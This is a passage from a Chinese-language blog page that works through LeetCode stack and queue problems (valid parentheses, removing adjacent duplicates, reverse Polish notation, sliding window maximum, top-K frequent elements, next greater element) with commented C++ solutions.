x_stack.<span class="built_in">pop</span>();</span><br><span class="line">        min_stack.<span class="built_in">pop</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">top</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> x_stack.<span class="built_in">top</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">getMin</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> min_stack.<span class="built_in">top</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="20-有效的括号"><a href="#20-有效的括号" class="headerlink" title="20 有效的括号"></a>20 有效的括号</h3><p>给定一个只包括 ‘(‘，’)’，’{‘，’}’，’[‘，’]’ 的字符串 s ，判断字符串是否有效。</p><p>有效字符串需满足：</p><pre><code>左括号必须用相同类型的右括号闭合。左括号必须以正确的顺序闭合。每个右括号都有一个对应的相同类型的左括号。</code></pre><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//unordered_map&lt;char,char&gt; pairs=&#123;&#125;;</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isValid</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = s.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">if</span>(n%<span class="number">2</span>==<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;<span class="comment">//如果长度是奇数，则一定不闭合</span></span><br><span class="line">        &#125;</span><br><span class="line">        unordered_map&lt;<span class="keyword">char</span>,<span class="keyword">char</span>&gt; pairs=&#123;</span><br><span class="line">            &#123;<span class="string">&#x27;)&#x27;</span>,<span class="string">&#x27;(&#x27;</span>&#125;,<span class="comment">//key value</span></span><br><span class="line">            &#123;<span class="string">&#x27;]&#x27;</span>,<span class="string">&#x27;[&#x27;</span>&#125;,</span><br><span class="line">            &#123;<span class="string">&#x27;&#125;&#x27;</span>,<span class="string">&#x27;&#123;&#x27;</span>&#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        stack&lt;<span class="keyword">int</span>&gt; stk;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">char</span> ch:s)&#123;</span><br><span class="line">            <span class="keyword">if</span>(pairs.<span class="built_in">count</span>(ch))&#123;<span class="comment">//如果栈顶是右括号，则查找匹配</span></span><br><span class="line">                <span class="keyword">if</span>(stk.<span class="built_in">empty</span>() || stk.<span class="built_in">top</span>() != pairs[ch])<span class="comment">//不匹配</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                stk.<span class="built_in">pop</span>();<span class="comment">//匹配，弹出</span></span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;<span class="comment">//如果 栈顶左括号，直接入栈</span></span><br><span class="line">                stk.<span class="built_in">push</span>(ch);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> stk.<span class="built_in">empty</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="1047-删除字符串中的所有相邻重复项"><a href="#1047-删除字符串中的所有相邻重复项" class="headerlink" title="1047 删除字符串中的所有相邻重复项"></a>1047 删除字符串中的所有相邻重复项</h3><p>给出由小写字母组成的字符串 S，重复项删除操作会选择两个相邻且相同的字母，并删除它们。<br>在 S 上<strong>反复执行</strong>重复项删除操作，直到无法继续删除。<br><strong>注意：消除之后又有新的元素可能挨在一起</strong><br>在完成所有重复项删除操作后返回最终的字符串。答案保证唯一。</p><p>示例：<br>输入：”abbaca”<br>输出：”ca”</p><p><strong>分析：</strong><br>本题要删除相邻相同元素，相对于<code>20. 有效的括号</code>来说其实也是匹配问题，之前是匹配左右括号，本题是<strong>匹配相邻元素</strong>，最后都是做消除的操作。<br>栈的目的，就是存放遍历过的元素，当遍历当前的这个元素的时候，去栈里看一下我们是不是遍历过相同数值的相邻元素。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    栈：push()  pop()</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">removeDuplicates</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        stack&lt;<span class="keyword">char</span>&gt; stk;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">char</span> c:s)&#123;</span><br><span class="line">            <span class="keyword">if</span>(stk.<span class="built_in">empty</span>() || stk.<span class="built_in">top</span>()!=c)</span><br><span class="line">                stk.<span class="built_in">push</span>(c);</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                stk.<span class="built_in">pop</span>();<span class="comment">//当前遍历元素 等于 栈顶部元素，则需要消除</span></span><br><span class="line">        &#125;</span><br><span class="line">        string res = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">while</span>(!stk.<span class="built_in">empty</span>())&#123;</span><br><span class="line">            res += stk.<span class="built_in">top</span>();</span><br><span class="line">            stk.<span class="built_in">pop</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">reverse</span>(res.<span class="built_in">begin</span>(),res.<span class="built_in">end</span>());<span class="comment">//逆序一下</span></span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    直接使用字符串的 push_back() 和 pop_back()</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">removeDuplicates</span><span class="params">(string S)</span> </span>&#123;</span><br><span class="line">        string result;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">char</span> s : S) &#123;</span><br><span class="line">            <span class="keyword">if</span>(result.<span class="built_in">empty</span>() || result.<span class="built_in">back</span>()!=s) &#123;</span><br><span class="line">                result.<span class="built_in">push_back</span>(s);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                result.<span class="built_in">pop_back</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="150-逆波兰表达式求值"><a href="#150-逆波兰表达式求值" class="headerlink" title="150 逆波兰表达式求值"></a>150 逆波兰表达式求值</h3><p>给你一个字符串数组 tokens ，表示一个根据 逆波兰表示法 表示的算术表达式。<br>计算该表达式。返回一个表示表达式值的整数。<br><strong>【后缀表达式】对计算机来说是非常友好的</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    只用一个栈：存操作数</span></span><br><span class="line"><span class="comment">    只用按照正常的顺序遍历，当遇到符号时就 弹出数字栈的两个元素进行操作即可</span></span><br><span class="line"><span class="comment">    tokens = [&quot;2&quot;,&quot;1&quot;,&quot;+&quot;,&quot;3&quot;,&quot;*&quot;]</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">evalRPN</span><span class="params">(vector&lt;string&gt;&amp; tokens)</span> </span>&#123;</span><br><span class="line">        stack&lt;<span class="keyword">long</span> <span class="keyword">long</span>&gt; stk_nums;<span class="comment">//注意：long long</span></span><br><span class="line">        <span class="comment">//数字转字符串：to_string()</span></span><br><span class="line">        <span class="comment">//字符串转数字：stoi()、stol()、stof()、stod()等等</span></span><br><span class="line">        <span class="keyword">for</span>(string c:tokens)&#123;</span><br><span class="line">            <span class="keyword">if</span>(c==<span class="string">&quot;+&quot;</span> || c==<span class="string">&quot;-&quot;</span> || c==<span class="string">&quot;*&quot;</span> || c==<span class="string">&quot;/&quot;</span>)&#123;</span><br><span class="line">                <span class="keyword">long</span> <span class="keyword">long</span> a = stk_nums.<span class="built_in">top</span>();</span><br><span class="line">                stk_nums.<span class="built_in">pop</span>();</span><br><span class="line">                <span class="keyword">long</span> <span class="keyword">long</span> b = stk_nums.<span class="built_in">top</span>();</span><br><span class="line">                stk_nums.<span class="built_in">pop</span>();</span><br><span class="line">                <span class="keyword">long</span> <span class="keyword">long</span> res;</span><br><span class="line">                <span class="built_in"><span class="keyword">switch</span></span>(c[<span class="number">0</span>])&#123;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&#x27;*&#x27;</span>:</span><br><span class="line">                        res = b * a;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&#x27;/&#x27;</span>:</span><br><span class="line">                        res = b / a;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">                        res = b + a;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">                        res = b - a;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">default</span>:</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                stk_nums.<span class="built_in">push</span>(res);<span class="comment">//结果入栈</span></span><br><span class="line">            &#125;<span class="keyword">else</span></span><br><span class="line">                stk_nums.<span class="built_in">push</span>(<span class="built_in">stoll</span>(c));<span class="comment">//入数字</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> stk_nums.<span class="built_in">top</span>();<span class="comment">//最终结果在栈顶</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="239-滑动窗口最大值——（deque双端队列【自定义-单调队列】-priority-queue大顶堆）"><a href="#239-滑动窗口最大值——（deque双端队列【自定义-单调队列】-priority-queue大顶堆）" class="headerlink" title="239 滑动窗口最大值——（deque双端队列【自定义 单调队列】/priority_queue大顶堆）"></a>239 滑动窗口最大值——（deque双端队列【自定义 单调队列】/priority_queue大顶堆）</h3><p>给你一个整数数组 nums，有一个大小为 k 的滑动窗口从数组的最左侧移动到数组的最右侧。你只可以看到在滑动窗口内的 k 个数字。<br>滑动窗口每次只向右移动一位，返回【滑动窗口中的最大值】。<br><img src="https://img-blog.csdnimg.cn/378f7a45e94d421593d273882dea54a2.png"><br><strong>法一：priority_queue&lt;pair&lt;int,int&gt;&gt; q;</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">maxSlidingWindow</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        priority_queue&lt;pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;&gt; q;<span class="comment">//值，下标</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;k;i++)<span class="comment">//前 k 个元素放入优先队列</span></span><br><span class="line">            q.<span class="built_in">emplace</span>(nums[i],i);<span class="comment">//入大根堆</span></span><br><span class="line">        vector&lt;<span class="keyword">int</span>&gt; res = &#123;q.<span class="built_in">top</span>().first&#125;;<span class="comment">//前三个元素的最大值已存入</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=k;i&lt;n;i++)&#123;</span><br><span class="line">            q.<span class="built_in">emplace</span>(nums[i],i);</span><br><span class="line">            <span class="keyword">while</span>(q.<span class="built_in">top</span>().second &lt;= i-k)</span><br><span class="line">                q.<span class="built_in">pop</span>();</span><br><span class="line">            res.<span class="built_in">push_back</span>(q.<span class="built_in">top</span>().first);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>法二：使用deque实现 自定义的单调队列</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">MyQueue</span> &#123;</span> <span class="comment">//单调队列（从大到小）</span></span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        deque&lt;<span class="keyword">int</span>&gt; que; <span class="comment">// 使用deque来实现单调队列</span></span><br><span class="line">        <span class="function"><span class="keyword">void</span> <span class="title">pop</span><span class="params">(<span class="keyword">int</span> value)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (!que.<span class="built_in">empty</span>() &amp;&amp; value == que.<span class="built_in">front</span>()) &#123;<span class="comment">//出口值 即 最大值</span></span><br><span class="line">                que.<span class="built_in">pop_front</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// push：存 最大值</span></span><br><span class="line">        <span class="function"><span class="keyword">void</span> <span class="title">push</span><span class="params">(<span class="keyword">int</span> value)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">while</span> (!que.<span class="built_in">empty</span>() &amp;&amp; value&gt;que.<span class="built_in">back</span>())&#123;</span><br><span class="line">                que.<span class="built_in">pop_back</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            que.<span class="built_in">push_back</span>(value);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 查询当前队列里的最大值</span></span><br><span class="line">        <span class="function"><span class="keyword">int</span> <span class="title">front</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> que.<span class="built_in">front</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">maxSlidingWindow</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        MyQueue que;</span><br><span class="line">        vector&lt;<span class="keyword">int</span>&gt; result;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;k; i++) &#123; <span class="comment">// 先将前k的元素放进队列</span></span><br><span class="line">            que.<span class="built_in">push</span>(nums[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//最大值在 front处</span></span><br><span class="line">        result.<span class="built_in">push_back</span>(que.<span class="built_in">front</span>()); <span class="comment">// result记录前k的元素的最大值</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=k; i&lt;nums.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            que.<span class="built_in">pop</span>(nums[i-k]); <span class="comment">// 滑动窗口移除最前面元素</span></span><br><span class="line">            que.<span class="built_in">push</span>(nums[i]); <span class="comment">// 滑动窗口前加入最后面的元素</span></span><br><span class="line">            result.<span class="built_in">push_back</span>(que.<span class="built_in">front</span>()); <span class="comment">// 记录对应的最大值</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="347-前-K-个高频元素——小顶堆-大顶堆（用到了-priority-queue【定义-小顶堆】）"><a href="#347-前-K-个高频元素——小顶堆-大顶堆（用到了-priority-queue【定义-小顶堆】）" class="headerlink" title="347 前 K 个高频元素——小顶堆/大顶堆（用到了 priority_queue【定义-小顶堆】）"></a>347 前 K 个高频元素——小顶堆/大顶堆（用到了 priority_queue【定义-小顶堆】）</h3><p>给你一个整数数组 nums 和一个整数 k ，请你返回其中 <strong>出现频率</strong> <strong>前k高的元素</strong>。你可以按 任意顺序 返回答案。<br>示例 1:<br>输入: nums = [1,1,1,2,2,3], k = 2<br>输出: [1,2]</p><p><strong>只用维护 k 个元素的集合（按照频率排序）——&gt; 大顶堆、小顶堆</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*  </span></span><br><span class="line"><span class="comment">    type：数据类型；</span></span><br><span class="line"><span class="comment">    container：实现优先队列的底层容器；</span></span><br><span class="line"><span class="comment">    function：元素之间的比较方式；</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// 新规则：小顶堆 return lhs.second &gt; rhs.second;</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">mycomparison</span> &#123;</span></span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="function"><span class="keyword">bool</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="keyword">const</span> pair&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt;&amp; lhs, <span class="keyword">const</span> pair&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt;&amp; rhs)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> lhs.second &gt; rhs.second;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">topKFrequent</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 要统计元素出现频率</span></span><br><span class="line">        unordered_map&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; map;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            map[nums[i]]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 对频率排序</span></span><br><span class="line">        <span class="comment">// 定义一个小顶堆，大小为k</span></span><br><span class="line">        priority_queue&lt;pair&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt;, vector&lt;pair&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt;&gt;, mycomparison&gt; pri_que;</span><br><span class="line">        <span class="comment">// 用固定大小为k的小顶堆，扫面所有频率的数值</span></span><br><span class="line">        <span class="keyword">for</span> (unordered_map&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt;::iterator it = map.<span class="built_in">begin</span>(); it != map.<span class="built_in">end</span>(); it++) &#123;</span><br><span class="line">            pri_que.<span class="built_in">push</span>(*it);</span><br><span class="line">            <span class="keyword">if</span> (pri_que.<span class="built_in">size</span>() &gt; k) &#123; <span class="comment">// 如果堆的大小大于了K，则队列弹出，保证堆的大小一直为k</span></span><br><span class="line">                pri_que.<span class="built_in">pop</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 找出前K个高频元素，因为小顶堆先弹出的是最小的，所以倒序来输出到数组</span></span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">result</span><span class="params">(k)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=k<span class="number">-1</span>; i&gt;=<span class="number">0</span>; i--) &#123;</span><br><span class="line">            result[i] = pri_que.<span class="built_in">top</span>().first;</span><br><span class="line">            pri_que.<span class="built_in">pop</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="496-下一个更大元素-I——线性数组"><a href="#496-下一个更大元素-I——线性数组" class="headerlink" title="496 下一个更大元素 I——线性数组"></a>496 下一个更大元素 I——线性数组</h3><p>nums1 中数字 x 的 下一个更大元素 是指 x 在 nums2 中【对应位置右侧】的【第一个】【比 x 大的元素】。</p><p>给你两个 没有重复元素 的数组 nums1 和 nums2 ，下标从 0 开始计数，其中nums1 是 nums2 的子集。</p><p>对于每个 0 &lt;= i &lt; nums1.length ，找出满足 nums1[i] == nums2[j] 的下标 j ，并且在 nums2 确定 nums2[j] 的 下一个更大元素 。如果不存在下一个更大元素，那么本次查询的答案是 -1 。</p><p>返回一个长度为 nums1.length 的数组 ans 作为答案，满足 ans[i] 是如上所述的 下一个更大元素 。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    暴力 O(mn)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">nextGreaterElement</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums1, vector&lt;<span class="keyword">int</span>&gt;&amp; nums2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> m = nums1.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">int</span> n = nums2.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">res</span><span class="params">(m)</span></span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;m;i++)&#123;</span><br><span class="line">            <span class="keyword">int</span> j=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span>(j&lt;n &amp;&amp; nums2[j] != nums1[i])&#123;</span><br><span class="line">                j++;<span class="comment">//寻找 nums2中 值和nums1[i]相等的 下标</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">int</span> k=j+<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">while</span>(k&lt;n &amp;&amp; nums2[k] &lt; nums1[i])&#123;</span><br><span class="line">                k++;</span><br><span class="line">            &#125;</span><br><span class="line">            res[i] = k&lt;n? nums2[k]:<span class="number">-1</span>;<span class="comment">//k!=n</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    单调栈+哈希表O(m+n) </span></span><br><span class="line"><span class="comment">    unordered_map&lt;int,int&gt; hashmap;</span></span><br><span class="line"><span class="comment">    返回：值，值</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">nextGreaterElement</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums1, vector&lt;<span class="keyword">int</span>&gt;&amp; nums2)</span> </span>&#123;</span><br><span class="line">        unordered_map&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; hashmap;</span><br><span class="line">        stack&lt;<span class="keyword">int</span>&gt; stk;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> 